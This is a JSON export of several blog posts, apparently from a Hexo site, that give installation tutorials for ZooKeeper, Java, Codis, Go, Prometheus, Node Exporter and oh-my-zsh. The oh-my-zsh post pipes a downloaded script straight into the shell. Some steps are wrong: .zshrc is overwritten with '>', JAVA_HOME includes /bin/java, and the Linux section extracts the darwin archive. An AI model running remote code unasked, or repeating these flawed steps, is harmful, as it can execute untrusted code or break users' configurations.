[{"title":"【ZooKeeper】学习","date":"2020-07-25T10:37:37.000Z","path":"2020/07/25/【ZooKeeper】学习/","text":"ZooKeeper 是一个典型的分布式数据一致性解决方案，分布式应用程序可以基于 ZooKeeper 实现诸如数据发布/订阅、负载均衡、命名服务、分布式协调/通知、集群管理、Master 选举、分布式锁和分布式队列等功能。 Zookeeper 一个最常用的使用场景就是用于担任服务生产者和服务消费者的注册中心。 服务生产者将自己提供的服务注册到Zookeeper中心，服务的消费者在进行服务调用的时候先到Zookeeper中查找服务，获取到服务生产者的详细信息之后，再去调用服务生产者的内容与数据。如下图所示，在 Dubbo架构中 Zookeeper 就担任了注册中心这一角色。 Reference https://segmentfault.com/a/1190000016349824","comments":true,"categories":[{"name":"ZooKeeper","slug":"ZooKeeper","permalink":"http://swsmile.info/categories/ZooKeeper/"}],"tags":[{"name":"ZooKeeper","slug":"ZooKeeper","permalink":"http://swsmile.info/tags/ZooKeeper/"}]},{"title":"【ZooKeeper】安装","date":"2020-07-25T08:36:35.000Z","path":"2020/07/25/【ZooKeeper】安装/","text":"Prerequisition安装 ZooKeeper 之前需要先安装 JDK, 关于 JDK 的安装这里不再赘述。 Downloadhttps://zookeeper.apache.org/releases.html 1234$ curl -O https://downloads.apache.org/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz$ tar -zxf apache-zookeeper-3.6.1-bin.tar.gz$ cd apache-zookeeper-3.6.1-bin$ mkdir data Configuring ZooKeeperCreate a configuration file named zoo.cfg at /opt/zookeeper/conf. You can create and open a file using nano or your favorite editor: 1$ nano /home/parallels/apache-zookeeper-3.6.1-bin/conf/zoo.cfg Add the following set of properties and values to that file: 12345tickTime=2000initLimit=10syncLimit=5dataDir=/home/parallels/apache-zookeeper-3.6.1-bin/dataclientPort=2181 A tickTime of 2000 milliseconds is the suggested interval between heartbeats. A shorter interval could lead to system overhead with limited benefits. The dataDir parameter points to the path defined by the symbolic link you created in the previous section. Conventionally, ZooKeeper uses port 2181 to listen for client connections. In most situations, 60 allowed client connections are plenty for development and testing. Save the file and exit the editor. You have configured ZooKeeper and are ready to start the server. 12345$ bin/zkServer.sh start/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: /home/parallels/apache-zookeeper-3.6.1-bin/bin/../conf/zoo.cfgStarting zookeeper ... STARTED 如果出现： 12345$ bin/zkServer.sh start/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: /home/parallels/apache-zookeeper-3.6.1/bin/../conf/zoo.cfgStarting zookeeper ... FAILED TO START 则可以检查对应log： 123$ cat logs/zookeeper-parallels-server-parallels-Parallels-Virtual-Platform.outError: Could not find or load main class org.apache.zookeeper.server.quorum.QuorumPeerMainCaused by: java.lang.ClassNotFoundException: org.apache.zookeeper.server.quorum.QuorumPeerMain 这是因为你下载的不是binary，而是source code。我们要下载： 1$ curl -O https://downloads.apache.org/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz 而不是： 1$ curl - O https://downloads.apache.org/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1.tar.gz Testing the Standalone InstallationConnect to the local ZooKeeper server with the following command: 12345$ bin/zkCli.sh -server 127.0.0.1:2181Connecting to 127.0.0.1:2181......[zk: 127.0.0.1:2181(CONNECTED) 0] Reference https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-an-apache-zookeeper-cluster-on-ubuntu-18-04","comments":true,"categories":[{"name":"ZooKeeper","slug":"ZooKeeper","permalink":"http://swsmile.info/categories/ZooKeeper/"}],"tags":[{"name":"ZooKeeper","slug":"ZooKeeper","permalink":"http://swsmile.info/tags/ZooKeeper/"}]},{"title":"【Java】安装","date":"2020-07-25T08:25:43.000Z","path":"2020/07/25/【Java】安装/","text":"UbuntuExecute the following command to install the default Java Runtime Environment (JRE), which will install the JRE from OpenJDK 11: 1$ apt install default-jre The JRE will allow you to run almost all Java software. Verify the installation with: 1$ java -version You’ll see the following output: 123Outputopenjdk version &quot;11.0.7&quot; 2020-04-14OpenJDK Runtime Environment (build 11.0.7+10-post-Ubuntu-2ubuntu218.04)OpenJDK 64-Bit Server VM (build 11.0.7+10-post-Ubuntu-2ubuntu218.04, mixed mode, sharing) You may need the Java Development Kit (JDK) in addition to the JRE in order to compile and run some specific Java-based software. To install the JDK, execute the following command, which will also install the JRE: 1$ sudo apt install default-jdk Verify that the JDK is installed by checking the version of javac, the Java compiler: 1$ javac -version You’ll see the following output: 1Outputjavac 11.0.7 Setting the JAVA_HOME Environment VariableMany programs written using Java use the JAVA_HOME environment variable to determine the Java installation location. To set this environment variable, first determine where Java is installed. Use the update-alternatives command: 1sudo update-alternatives --config java This command shows each installation of Java along with its installation path: 123456789OutputThere are 2 choices for the alternative java (providing /usr/bin/java). Selection Path Priority Status------------------------------------------------------------ 0 /usr/lib/jvm/java-11-openjdk-amd64/bin/java 1111 auto mode 1 /usr/lib/jvm/java-11-openjdk-amd64/bin/java 1111 manual mode* 2 /usr/lib/jvm/java-11-oracle/bin/java 1091 manual modePress &lt;enter&gt; to keep the current choice[*], or type selection number: In this case the installation paths are as follows: OpenJDK 11 is located at /usr/lib/jvm/java-11-openjdk-amd64/bin/java. Oracle Java is located at /usr/lib/jvm/java-11-oracle/jre/bin/java. Copy the path from your preferred installation. Then open /etc/environment using nano or your favorite text editor: 1sudo nano /etc/environment At the end of this file, add the following line, making sure to replace the highlighted path with your own copied path, but do not include the /bin portion of the path: /etc/environment 1JAVA_HOME=&quot;/usr/lib/jvm/java-11-openjdk-amd64/bin/java&quot; Modifying this file will set the JAVA_HOME path for all users on your system. Save the file and exit the editor. Now reload this file to apply the changes to your current session: 1source /etc/environment Verify that the environment variable is set: 1echo $JAVA_HOME You’ll see the path you just set: 1Output/usr/lib/jvm/java-11-openjdk-amd64 Other users will need to execute the command source /etc/environment or log out and log back in to apply this setting. Reference https://www.digitalocean.com/community/tutorials/how-to-install-java-with-apt-on-ubuntu-18-04","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Redis】Codis 安装","date":"2020-07-25T08:19:44.000Z","path":"2020/07/25/【Redis】Codis-安装/","text":"Prerequisition安装Go12$ echo &quot;export GOPATH=/home/parallels/go&quot; &gt; .zshrc$ echo &quot;export GOROOT=/usr/lib/go-1.14&quot; &gt; .zshrc 安装Java安装Zookeeper安装 autoconf1$ sudo apt-get install autoconf 手动编译1234$ sudo mkdir -p $GOPATH/src/github.com/CodisLabs$ cd $_ &amp;&amp; git clone https://github.com/CodisLabs/codis.git -b release3.2$ echo \"export PATH=$GOPATH/src/github.com/CodisLabs/codis/bin:$PATH\" &gt; ~/.zshrc$ sudo make Binary123$ curl -OL https://github.com/CodisLabs/codis/releases/download/3.2.2/codis3.2.2-go1.8.5-linux.zip$ unzip codis3.2.2-go1.8.5-linux.zip$ cd codis3.2.2-go1.8.5-linux 启动1$ ./codis-dashboard Reference https://github.com/CodisLabs/codis/blob/release3.2/doc/tutorial_zh.md","comments":true,"categories":[{"name":"CacheSystem","slug":"CacheSystem","permalink":"http://swsmile.info/categories/CacheSystem/"},{"name":"Redis","slug":"CacheSystem/Redis","permalink":"http://swsmile.info/categories/CacheSystem/Redis/"},{"name":"Codis","slug":"CacheSystem/Redis/Codis","permalink":"http://swsmile.info/categories/CacheSystem/Redis/Codis/"}],"tags":[{"name":"Cache System","slug":"Cache-System","permalink":"http://swsmile.info/tags/Cache-System/"},{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"},{"name":"Codis","slug":"Codis","permalink":"http://swsmile.info/tags/Codis/"}]},{"title":"【Golang】Golang 安装","date":"2020-07-23T16:01:27.000Z","path":"2020/07/24/【Golang】Golang-安装/","text":"UbuntuIf you’re using Ubuntu 18.04 LTS or 19.10 on amd64, arm64, armhf or i386, then you can use the longsleep/golang-backports PPA and install Go 1.14. 123$ sudo add-apt-repository ppa:longsleep/golang-backports$ sudo apt update$ sudo apt install golang-go Reference https://github.com/golang/go/wiki/Ubuntu","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Performance】Prometheus - Exporter - Redis Exporter","date":"2020-07-23T15:57:07.000Z","path":"2020/07/23/【Performance】Prometheus-Exporter-Redis-Exporter/","text":"Build and run locally1234$ git clone https://github.com/oliver006/redis_exporter.git$ cd redis_exporter$ go build .$ nohup /home/parallels/redis_exporter/redis_exporter &amp; Basic Prometheus ConfigurationAdd a block to the scrape_configs of your prometheus.yml config file: 1234scrape_configs: - job_name: redis_exporter static_configs: - targets: ['&lt;&lt;REDIS-EXPORTER-HOSTNAME&gt;&gt;:9121'] and adjust the host name accordingly. See Metrics from GrafanaGrafana Dashboard for Redis: https://grafana.com/grafana/dashboards/763 Trigger some Redis call: 1$ redis-benchmark -n 1000000 -r 10000000 -q -h 192.168.2.204 Reference https://github.com/oliver006/redis_exporter#prometheus-configuration-to-scrape-multiple-redis-hosts","comments":true,"categories":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/categories/Performance/"}],"tags":[{"name":"Performancede","slug":"Performancede","permalink":"http://swsmile.info/tags/Performancede/"}]},{"title":"【Performance】Prometheus 深入","date":"2020-07-23T15:38:52.000Z","path":"2020/07/23/【Performance】Prometheus-深入/","text":"PrometheusPrometheus, a Cloud Native Computing Foundation project, is a systems and service monitoring system. It collects metrics from configured targets at given intervals, evaluates rule expressions, displays the results, and can trigger alerts if some condition is observed to be true. Prometheus’s main distinguishing features as compared to other monitoring systems are: a multi-dimensional data model (timeseries defined by metric name and set of key/value dimensions) a flexible query language to leverage this dimensionality no dependency on distributed storage; single server nodes are autonomous timeseries collection happens via a pull model over HTTP pushing timeseries is supported via an intermediary gateway targets are discovered via service discovery or static configuration multiple modes of graphing and dashboarding support support for hierarchical and horizontal federation Architecture overview Configuring Prometheus to monitor itselfPrometheus collects metrics from monitored targets by scraping metrics HTTP endpoints on these targets. Since Prometheus also exposes data in the same manner about itself, it can also scrape and monitor its own health. While a Prometheus server that collects only data about itself is not very useful in practice, it is a good starting example. Save the following basic Prometheus configuration as a file named prometheus.yml: 12345678910111213141516171819global: scrape_interval: 15s # By default, scrape targets every 15 seconds. # Attach these labels to any time series or alerts when communicating with # external systems (federation, remote storage, Alertmanager). external_labels: monitor: &apos;codelab-monitor&apos;# A scrape configuration containing exactly one endpoint to scrape:# Here it&apos;s Prometheus itself.scrape_configs: # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config. - job_name: &apos;prometheus&apos; # Override the global default and scrape targets from this job every 5 seconds. scrape_interval: 5s static_configs: - targets: [&apos;localhost:9090&apos;] For a complete specification of configuration options, see the configuration documentation. Prometheus Metrics Formathttps://prometheus.io/docs/instrumenting/exposition_formats/ Metric Typeshttps://prometheus.io/docs/concepts/metric_types/ CounterGaugeHistogramSummaryJobs and Instanceshttps://prometheus.io/docs/concepts/jobs_instances/ Reference https://github.com/prometheus/prometheus https://prometheus.io/docs/prometheus/","comments":true,"categories":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/categories/Performance/"}],"tags":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/tags/Performance/"}]},{"title":"【Linux】安装 oh-my-zsh","date":"2020-07-23T12:22:01.000Z","path":"2020/07/23/【Linux】安装oh-my-zsh/","text":"1234$ sudo apt install git$ sudo apt install zsh$ chsh -s $(which zsh)$ sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" Reference https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH https://github.com/ohmyzsh/ohmyzsh","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Performance】Promethues - Exporter","date":"2020-07-22T15:53:39.000Z","path":"2020/07/22/【Performance】Promethues-Exporter/","text":"所有的Exporter：https://prometheus.io/docs/instrumenting/exporters/#exporters-and-integrations Redis Exporter：https://github.com/oliver006/redis_exporter Golang Exporter：https://github.com/prometheus/mysqld_exporter Prometheus Client Library - 为自己的服务写如果我们想监控的服务是一个自己写的服务，而不是MySQL、Redis等等，则可以基于 Prometheus Client Library 来为自己的服务写一个该服务的 Exporter： Go：https://github.com/prometheus/client_golang Java or Scala Python Ruby 如果我们使用的编程语言还没有被 Prometheus Client Library 覆盖，则可以考虑直接生成 Prometheus text-based exposition format，参考 https://prometheus.io/docs/instrumenting/exposition_formats/ 。 Ref https://prometheus.io/docs/instrumenting/writing_clientlibs/ https://prometheus.io/docs/instrumenting/writing_exporters/","comments":true,"categories":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/categories/Performance/"}],"tags":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/tags/Performance/"}]},{"title":"【Performance】Prometheus - Node Exporter","date":"2020-07-22T15:25:04.000Z","path":"2020/07/22/【Performance】Prometheus-Exporter-Node-Exporter/","text":"安装Node Exporter 在Prometheus的架构设计中，Prometheus Server并不直接服务监控特定的目标，其主要任务负责数据的收集，存储并且对外提供数据查询支持。因此为了能够能够监控到某些东西，如主机的CPU使用率，我们需要使用到Exporter。Prometheus周期性的从Exporter暴露的HTTP服务地址（通常是/metrics）拉取监控样本数据。 xporter可以是一个相对开放的概念，其可以是一个独立运行的程序独立于监控目标以外，也可以是直接内置在监控目标中。只要能够向Prometheus提供标准格式的监控样本数据即可。 这里为了能够采集到主机的运行指标如CPU, 内存，磁盘等信息。我们可以使用Node Exporter 。 Node Exporter同样采用Golang编写，并且不存在任何的第三方依赖，只需要下载，解压即可运行。可以从 https://prometheus.io/download/ 获取最新的node exporter版本的二进制包。 macOS 12$ curl -OL https://github.com/prometheus/node_exporter/releases/download/v1.0.1/node_exporter-1.0.1.darwin-amd64.tar.gz$ tar -xzf node_exporter-1.0.1.darwin-amd64.tar.gz Linux 12$ curl -OL https://github.com/prometheus/node_exporter/releases/download/v1.0.1/node_exporter-1.0.1.linux-amd64.tar.gz$ tar -xzf node_exporter-1.0.1.darwin-amd64.tar.gz 运行node exporter: 12345$ cd node_exporter-1.0.1.darwin-amd64$ ./node_exporter# Or$ nohup /home/parallels/node_exporter-1.0.1.linux-amd64/node_exporter &amp; 启动成功后，可以看到以下输出： 1234567891011121314151617181920212223242526272829303132333435363738394041424344level=info ts=2020-07-22T15:10:28.758Z caller=node_exporter.go:177 msg=\"Starting node_exporter\" version=\"(version=1.0.1, branch=HEAD, revision=3715be6ae899f2a9b9dbfd9c39f3e09a7bd4559f)\"level=info ts=2020-07-22T15:10:28.758Z caller=node_exporter.go:178 msg=\"Build context\" build_context=\"(go=go1.14.4, user=root@1f76dbbcfa55, date=20200616-12:44:12)\"level=info ts=2020-07-22T15:10:28.759Z caller=node_exporter.go:105 msg=\"Enabled collectors\"level=info ts=2020-07-22T15:10:28.759Z caller=node_exporter.go:112 collector=arplevel=info ts=2020-07-22T15:10:28.759Z caller=node_exporter.go:112 collector=bcachelevel=info ts=2020-07-22T15:10:28.759Z caller=node_exporter.go:112 collector=bondinglevel=info ts=2020-07-22T15:10:28.759Z caller=node_exporter.go:112 collector=btrfslevel=info ts=2020-07-22T15:10:28.759Z caller=node_exporter.go:112 collector=conntracklevel=info ts=2020-07-22T15:10:28.759Z caller=node_exporter.go:112 collector=cpulevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=cpufreqlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=diskstatslevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=edaclevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=entropylevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=filefdlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=filesystemlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=hwmonlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=infinibandlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=ipvslevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=loadavglevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=mdadmlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=meminfolevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=netclasslevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=netdevlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=netstatlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=nfslevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=nfsdlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=powersupplyclasslevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=pressurelevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=rapllevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=schedstatlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=sockstatlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=softnetlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=statlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=textfilelevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=thermal_zonelevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=timelevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=timexlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=udp_queueslevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=unamelevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=vmstatlevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=xfslevel=info ts=2020-07-22T15:10:28.760Z caller=node_exporter.go:112 collector=zfslevel=info ts=2020-07-22T15:10:28.761Z caller=node_exporter.go:191 msg=\"Listening on\" address=:9100level=info ts=2020-07-22T15:10:28.761Z caller=tls_config.go:170 msg=\"TLS is disabled and it cannot be enabled on the fly.\" http2=false 访问 http://localhost:9100/ 可以看到以下页面： 初识 Node Exporter 监控 metrics访问http://localhost:9100/metrics ，可以看到当前node exporter获取到的当前主机的所有监控数据，如下所示： 每一个监控指标之前都会有一段类似于如下形式的信息： 123456# HELP node_cpu Seconds the cpus spent in each mode.# TYPE node_cpu counternode_cpu&#123;cpu=&quot;cpu0&quot;,mode=&quot;idle&quot;&#125; 362812.7890625# HELP node_load1 1m load average.# TYPE node_load1 gaugenode_load1 3.0703125 其中HELP用于解释当前指标的含义，TYPE则说明当前指标的数据类型。在上面的例子中node_cpu的注释表明当前指标是cpu0上idle进程占用CPU的总时间，CPU占用时间是一个只增不减的度量指标，从类型中也可以看出node_cpu的数据类型是计数器（counter），与该指标的实际含义一致。又例如node_load1该指标反映了当前主机在最近一分钟以内的负载情况，系统的负载情况会随系统资源的使用而变化，因此node_load1反映的是当前状态，数据可能增加也可能减少，从注释中可以看出当前指标类型为仪表盘（gauge），与指标反映的实际含义一致。 除了这些以外，在当前页面中根据物理主机系统的不同，你还可能看到如下监控指标： node_boot_time：系统启动时间 node_cpu：系统CPU使用量 nodedisk*：磁盘IO nodefilesystem*：文件系统用量 node_load1：系统负载 nodememeory*：内存使用量 nodenetwork*：网络带宽 node_time：当前系统时间 go_*：node exporter中go相关指标 process_*：node exporter自身进程相关运行指标 通过 Prometheus UI （Prometheus expression browser）查看 MetricsYour locally running Prometheus instance needs to be properly configured in order to access Node Exporter metrics. The following scrape_config block (in a prometheus.yml configuration file) will tell the Prometheus instance to scrape from the Node Exporter via localhost:9100: 1234scrape_configs:- job_name: 'node' static_configs: - targets: ['localhost:9100'] Metrics specific to the Node Exporter are prefixed with node_ and include metrics like node_cpu_seconds_total and node_exporter_build_info. Click on the links below to see some example metrics: Metric Meaning rate(node_cpu_seconds_total{mode=&quot;system&quot;}[1m]) The average amount of CPU time spent in system mode, per second, over the last minute (in seconds) node_filesystem_avail_bytes The filesystem space available to non-root users (in bytes) rate(node_network_receive_bytes_total[1m]) The average network traffic received, per second, over the last minute (in bytes) Grafana查看Prometheus虽然自带了web页面，但一般会和更专业的Grafana配套做指标的可视化，Grafana有很多模板，用于更友好地展示出指标的情况，如 https://grafana.com/dashboards/8919 https://grafana.com/grafana/dashboards/1860 Reference https://prometheus.io/docs/guides/node-exporter/ https://github.com/prometheus/node_exporter https://yunlzheng.gitbook.io/prometheus-book/parti-prometheus-ji-chu/quickstart/prometheus-quick-start/use-node-exporter","comments":true,"categories":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/categories/Performance/"}],"tags":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/tags/Performance/"}]},{"title":"【Performance】Prometheus 初入","date":"2020-07-22T14:42:40.000Z","path":"2020/07/22/【Performance】Prometheus-初入/","text":"Prometheus强大的查询语言PromQLPrometheus内置了一个强大的数据查询语言PromQL。 通过PromQL可以实现对监控数据的查询、聚合。同时PromQL也被应用于数据可视化(如Grafana)以及告警当中。 通过PromQL可以轻松回答类似于以下问题： 在过去一段时间中95%应用延迟时间的分布范围？ 预测在4小时后，磁盘空间占用大致会是什么情况？ CPU占用率前5位的服务有哪些？(过滤) 易于集成使用Prometheus可以快速搭建监控服务，并且可以非常方便地在应用程序中进行集成。目前支持： Java， JMX， Python， Go，Ruby， .Net， Node.js等等语言的客户端SDK，基于这些SDK可以快速让应用程序纳入到Prometheus的监控当中，或者开发自己的监控数据收集程序。同时这些客户端收集的监控数据，不仅仅支持Prometheus，还能支持Graphite这些其他的监控工具。 同时Prometheus还支持与其他的监控系统进行集成：Graphite， Statsd， Collected， Scollector， muini， Nagios等。 Prometheus社区还提供了大量第三方实现的监控数据采集支持：JMX， CloudWatch， EC2， MySQL， PostgresSQL， Haskell， Bash， SNMP， Consul， Haproxy， Mesos， Bind， CouchDB， Django， Memcached， RabbitMQ， Redis， RethinkDB， Rsyslog等等。 可视化Prometheus Server中自带了一个Prometheus UI，通过这个UI可以方便地直接对数据进行查询，并且支持直接以图形化的形式展示数据。同时Prometheus还提供了一个独立的基于Ruby On Rails的Dashboard解决方案Promdash。最新的Grafana可视化工具也已经提供了完整的Prometheus支持，基于Grafana可以创建更加精美的监控图标。基于Prometheus提供的API还可以实现自己的监控可视化UI。 安装Prometheus ServermacOS 1234$ export VERSION=2.19.2$ curl -LO https://github.com/prometheus/prometheus/releases/download/v$VERSION/prometheus-$VERSION.darwin-amd64.tar.gz$ tar -xzf prometheus-$&#123;VERSION&#125;.darwin-amd64.tar.gz$ cd prometheus-$&#123;VERSION&#125;.darwin-amd64 Linux 123$ curl -LO https://github.com/prometheus/prometheus/releases/download/v2.19.2/prometheus-2.19.2.linux-amd64.tar.gz$ tar -xzf prometheus-2.19.2.linux-amd64.tar.gz$ cd prometheus-2.19.2.linux-amd64/ 解压后当前目录会包含默认的Prometheus配置文件promethes.yml: 1234567891011121314151617181920212223242526272829# my global configglobal: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s).# Alertmanager configurationalerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093# Load rules once and periodically evaluate them according to the global 'evaluation_interval'.rule_files: # - \"first_rules.yml\" # - \"second_rules.yml\"# A scrape configuration containing exactly one endpoint to scrape:# Here it's Prometheus itself.scrape_configs: # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config. - job_name: 'prometheus' # metrics_path defaults to '/metrics' # scheme defaults to 'http'. static_configs: - targets: ['localhost:9090'] Promtheus作为一个时间序列数据库，其采集的数据会以文件的形式存储在本地中，默认的存储路径为data/，因此我们需要先手动创建该目录： 1$ mkdir -p data 用户也可以通过参数--storage.tsdb.path=&quot;data/&quot;修改本地数据存储的路径。 启动prometheus服务，其会默认加载当前路径下的prometheus.yaml文件： 1234$ ./prometheus# Or$ nohup /home/parallels/prometheus-2.19.2.linux-amd64/prometheus &amp; 正常的情况下，你可以看到以下输出内容： 123456level=info ts=2018-10-23T14:55:14.499484Z caller=main.go:554 msg=&quot;Starting TSDB ...&quot;level=info ts=2018-10-23T14:55:14.499531Z caller=web.go:397 component=web msg=&quot;Start listening for connections&quot; address=0.0.0.0:9090level=info ts=2018-10-23T14:55:14.507999Z caller=main.go:564 msg=&quot;TSDB started&quot;level=info ts=2018-10-23T14:55:14.508068Z caller=main.go:624 msg=&quot;Loading configuration file&quot; filename=prometheus.ymllevel=info ts=2018-10-23T14:55:14.509509Z caller=main.go:650 msg=&quot;Completed loading of configuration file&quot; filename=prometheus.ymllevel=info ts=2018-10-23T14:55:14.509537Z caller=main.go:523 msg=&quot;Server is ready to receive web requests.&quot; 安装Node Exporter在Prometheus的架构设计中，Prometheus Server并不直接服务监控特定的目标，其主要任务负责数据的收集，存储并且对外提供数据查询支持。因此为了能够能够监控到某些东西，如主机的CPU使用率，我们需要使用到Exporter。Prometheus周期性的从Exporter暴露的HTTP服务地址（通常是/metrics）拉取监控样本数据。 从上面的描述中可以看出Exporter可以是一个相对开放的概念，其可以是一个独立运行的程序独立于监控目标以外，也可以是直接内置在监控目标中。只要能够向Prometheus提供标准格式的监控样本数据即可。 这里为了能够采集到主机的运行指标如CPU, 内存，磁盘等信息。我们可以使用Node Exporter。 Node Exporter同样采用Golang编写，并且不存在任何的第三方依赖，只需要下载，解压即可运行。可以从 https://prometheus.io/download/ 获取最新的node exporter版本的二进制包。 macOS 12$ curl -OL https://github.com/prometheus/node_exporter/releases/download/v1.0.1/node_exporter-1.0.1.darwin-amd64.tar.gz$ tar -xzf node_exporter-1.0.1.darwin-amd64.tar.gz Linux 12$ curl -OL https://github.com/prometheus/node_exporter/releases/download/v1.0.1/node_exporter-1.0.1.linux-amd64.tar.gz$ tar -xzf node_exporter-1.0.1.darwin-amd64.tar.gz 运行node exporter: 12$ cd node_exporter-1.0.1.darwin-amd64$ ./node_exporter 启动成功后，可以看到以下输出： 1INFO[0000] Listening on :9100 source=&quot;node_exporter.go:76&quot; 访问http://localhost:9100/可以看到以下页面： 初始Node Exporter监控指标访问http://localhost:9100/metrics ，可以看到当前node exporter获取到的当前主机的所有监控数据，如下所示： 每一个监控指标之前都会有一段类似于如下形式的信息： 123456# HELP node_cpu Seconds the cpus spent in each mode.# TYPE node_cpu counternode_cpu&#123;cpu=&quot;cpu0&quot;,mode=&quot;idle&quot;&#125; 362812.7890625# HELP node_load1 1m load average.# TYPE node_load1 gaugenode_load1 3.0703125 其中HELP用于解释当前指标的含义，TYPE则说明当前指标的数据类型。在上面的例子中node_cpu的注释表明当前指标是cpu0上idle进程占用CPU的总时间，CPU占用时间是一个只增不减的度量指标，从类型中也可以看出node_cpu的数据类型是计数器(counter)，与该指标的实际含义一致。又例如node_load1该指标反映了当前主机在最近一分钟以内的负载情况，系统的负载情况会随系统资源的使用而变化，因此node_load1反映的是当前状态，数据可能增加也可能减少，从注释中可以看出当前指标类型为仪表盘(gauge)，与指标反映的实际含义一致。 除了这些以外，在当前页面中根据物理主机系统的不同，你还可能看到如下监控指标： node_boot_time：系统启动时间 node_cpu：系统CPU使用量 nodedisk*：磁盘IO nodefilesystem*：文件系统用量 node_load1：系统负载 nodememeory*：内存使用量 nodenetwork*：网络带宽 node_time：当前系统时间 go_*：node exporter中go相关指标 process_*：node exporter自身进程相关运行指标 从Node Exporter收集监控数据为了能够让Prometheus Server能够从当前node exporter获取到监控数据，这里需要修改Prometheus配置文件。编辑prometheus.yml并在scrape_configs节点下添加以下内容: 12345678scrape_configs: - job_name: &apos;prometheus&apos; static_configs: - targets: [&apos;localhost:9090&apos;] # 采集node exporter监控数据 - job_name: &apos;node&apos; static_configs: - targets: [&apos;localhost:9100&apos;] 重新启动Prometheus Server 访问http://localhost:9090，进入到Prometheus Server。如果输入“up”并且点击执行按钮以后，可以看到如下结果： Expression Browser 如果Prometheus能够正常从node exporter获取数据，则会看到以下结果： 12up&#123;instance=&quot;localhost:9090&quot;,job=&quot;prometheus&quot;&#125; 1up&#123;instance=&quot;localhost:9100&quot;,job=&quot;node&quot;&#125; 1 其中“1”表示正常，反之“0”则为异常。 使用PromQL查询监控数据Prometheus UI是Prometheus内置的一个可视化管理界面，通过Prometheus UI用户能够轻松的了解Prometheus当前的配置，监控任务运行状态等。 通过Graph面板，用户还能直接使用PromQL实时查询监控数据： 切换到Graph面板，用户可以使用PromQL表达式查询特定监控指标的监控数据。如下所示，查询主机负载变化情况，可以使用关键字node_load1可以查询出Prometheus采集到的主机负载的样本数据，这些样本数据按照时间先后顺序展示，形成了主机负载随时间变化的趋势图表： PromQL是Prometheus自定义的一套强大的数据查询语言，除了使用监控指标作为查询关键字以为，还内置了大量的函数，帮助用户进一步对时序数据进行处理。 Prometheus 接入GrafanaPrometheus UI提供了快速验证PromQL以及临时可视化支持的能力，而在大多数场景下引入监控系统通常还需要构建可以长期使用的监控数据可视化面板（Dashboard）。这时用户可以考虑使用第三方的可视化工具如Grafana，Grafana是一个开源的可视化平台，并且提供了对Prometheus的完整支持。 